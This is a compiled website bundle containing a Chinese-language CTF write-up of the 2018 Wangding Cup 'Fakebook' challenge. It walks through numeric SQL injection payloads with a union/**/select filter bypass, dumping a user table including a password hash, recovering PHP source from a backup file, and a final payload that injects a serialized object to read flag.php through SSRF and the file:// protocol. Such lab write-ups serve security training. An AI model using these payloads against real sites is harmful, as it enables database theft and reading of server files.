"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[9490],{6888:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>l,contentTitle:()=>i,default:()=>p,frontMatter:()=>t,metadata:()=>s,toc:()=>a});const s=JSON.parse('{"id":"CTF/Misc/\u7f51\u9f0e\u676f2018-Fakebook","title":"\u7f51\u9f0e\u676f2018-Fakebook","description":"[\u7f51\u9f0e\u676f 2018]Fakebook","source":"@site/docs/CTF/Misc/\u7f51\u9f0e\u676f2018-Fakebook.md","sourceDirName":"CTF/Misc","slug":"/CTF/Misc/\u7f51\u9f0e\u676f2018-Fakebook","permalink":"/docs/CTF/Misc/\u7f51\u9f0e\u676f2018-Fakebook","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/Misc/\u7f51\u9f0e\u676f2018-Fakebook.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"\u7b2c\u4e09\u5c4a\u9ec4\u6cb3\u6d41\u57df\u516c\u5b89\u9662\u6821\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u6311\u6218\u8d5b","permalink":"/docs/CTF/Misc/\u7b2c\u4e09\u5c4a\u9ec4\u6cb3\u6d41\u57df\u516c\u5b89\u9662\u6821\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u6311\u6218\u8d5b"},"next":{"title":"\u7f8a\u57ce\u676f2020","permalink":"/docs/CTF/Misc/\u7f8a\u57ce\u676f2020"}}');var c=r(4848),o=r(8453);const t={},i=void 0,l={},a=[{value:"[\u7f51\u9f0e\u676f 2018]Fakebook",id:"\u7f51\u9f0e\u676f-2018fakebook",level:2}];function d(n){const e={blockquote:"blockquote",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,o.R)(),...n.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(e.h2,{id:"\u7f51\u9f0e\u676f-2018fakebook",children:"[\u7f51\u9f0e\u676f 2018]Fakebook"}),"\n",(0,c.jsx)(e.p,{children:"\u8003\u70b9\uff1asql\u6570\u5b57\u578b\u6ce8\u5165\uff0cphp\u5e8f\u5217\u5316\uff0cfile\u534f\u8bae,\u722c\u866b\u534f\u8bae\uff0c\u6e90\u7801\u5907\u4efd\uff0cSSRF"}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"\u5728view.php\u4e2d\u53d1\u73b0\u6570\u5b57\u578b\u6ce8\u5165"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"no=1 or 1=1 \u56de\u663e\u6210\u529f\r\nno=1 or 1=2 \u62a5\u9519\n"})}),"\n"]}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"\u8fdb\u884c\u8bfb\u53d6\u6570\u636e\u5e93\u6570\u636e"}),"\n"]}),"\n",(0,c.jsx)(e.p,{children:"\u6d4b\u8bd5\u5b57\u6bb5\u6570"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"no=-1 order by 1,2,3,4# \u4e00\u5171\u56db\u4e2a\u5b57\u6bb5\n"})}),"\n",(0,c.jsxs)(e.p,{children:["\u8bfb\u53d6\u6570\u636e\u5e93\u540d\uff08\u8fd9\u91cc",(0,c.jsx)(e.code,{children:"union select"}),"\u6574\u4f53\u88ab\u8fc7\u6ee4\u4e86\uff09"]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"-1 union/**/select 1,2,3,4\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u89c2\u5bdf\u9875\u9762\uff0c\u53d1\u73b0\u53ea\u67092\u4f4d\u7f6e\u6709\u56de\u663e\uff0c\u63a5\u7740\u5199\u8bed\u53e5"}),"\n",(0,c.jsx)(e.p,{children:"\u7206\u5f53\u524d\u6570\u636e\u5e93"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"-1 union/**/select 1,database(),3,4\r\nfakebook\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u7206\u8868\u540d"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'\r\nusers\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u7206\u5b57\u6bb5\u540d"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"-1 union/**/select 1,group_concat(column_name) ,3,4 from information_schema.columns where table_name='users'\r\nno,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u67e5\u770b\u5b57\u6bb5\u7684\u503c"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"-1 union/**/select 1,group_concat(no,';',username,';',passwd,';',data)  ,3,4 from users\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'1;11;74a49c698dbd3c12e36b0b287447d833f74f3937ff132ebff7054baa18623c35a705bb18b82e2ac0384b5127db97016e63609f712bc90e3506cfbea97599f46f;O:8:"UserInfo":3:{s:4:"name";s:2:"11";s:3:"age";i:11;s:4:"blog";s:9:"baidu.com";}\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u8fd9\u91ccdata\u7684\u503c\u662f\u5e8f\u5217\u5316\u5b57\u7b26\u4e32"}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"\u53d1\u73b0\u7f51\u7ad9\u76ee\u5f55\u4e0b\u8fd8\u6709robots.txt"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"User-agent: *\r\nDisallow: /user.php.bak\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u8bbf\u95ee/user.php.bak\uff0c\u4e0b\u8f7d\u6e90\u7801"}),"\n"]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'<?php\r\n\r\n\r\nclass UserInfo\r\n{\r\n    public $name = "";\r\n    public $age = 0;\r\n    public $blog = "";\r\n\r\n    public function __construct($name, $age, $blog)\r\n    {\r\n        $this->name = $name;\r\n        $this->age = (int)$age;\r\n        $this->blog = $blog;\r\n    }\r\n\r\n    function get($url)\r\n    {\r\n        $ch = curl_init();\r\n\r\n        curl_setopt($ch, CURLOPT_URL, $url);\r\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\n        $output = curl_exec($ch);\r\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\r\n        if($httpCode == 404) {\r\n            return 404;\r\n        }\r\n        curl_close($ch);\r\n\r\n        return $output;\r\n    }\r\n\r\n    public function getBlogContents ()\r\n    {\r\n        return $this->get($this->blog);\r\n    }\r\n\r\n    public function isValidBlog ()\r\n    {\r\n        $blog = $this->blog;\r\n        return preg_match("/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i", $blog);\r\n    }\r\n\r\n}\n'})}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"\u901a\u8fc7get\u83b7\u5f97\u6307\u5b9a\u7684URL\uff0c\u8bbe\u7f6ecurl \u53c2\u6570\uff0c\u5e76\u5c06\u6307\u5b9aURL\u7684\u5185\u5bb9\u8fd4\u56de\uff0c\u53ea\u8981\u8fd4\u56de\u5185\u5bb9\u4e0d\u4e3a404\u5373\u53ef"}),"\n"]}),"\n",(0,c.jsx)(e.p,{children:"\u6700\u540e\u7684payload"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'no=-1 union/**/select 1,2,3,\'O:8:"UserInfo":3:{s:4:"name";s:2:"11";s:3:"age";i:11;s:4:"blog";s:29:"file:///var/www/html/flag.php";}\'\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u5229\u7528SSRF\u6f0f\u6d1e\u548cfile\u534f\u8bae\uff0c\u8fd4\u56deflag.php\u7684\u5185\u5bb9"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240202220349663.png",alt:"image-20240202220349663"})}),"\n",(0,c.jsx)(e.p,{children:"base64\u89e3\u7801\u5373\u53ef"}),"\n",(0,c.jsx)(e.p,{children:"\u8fd9\u9898\u8003\u7684\u633a\u591a\u7684\uff0c\u8bb0\u5f55\u4e00\u4e0b\u89e3\u9898\u601d\u8def\u3002"})]})}function p(n={}){const{wrapper:e}={...(0,o.R)(),...n.components};return e?(0,c.jsx)(e,{...n,children:(0,c.jsx)(d,{...n})}):d(n)}},8453:(n,e,r)=>{r.d(e,{R:()=>t,x:()=>i});var s=r(6540);const c={},o=s.createContext(c);function t(n){const e=s.useContext(o);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function i(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(c):n.components||c:t(n.components),s.createElement(o.Provider,{value:e},n.children)}}}]);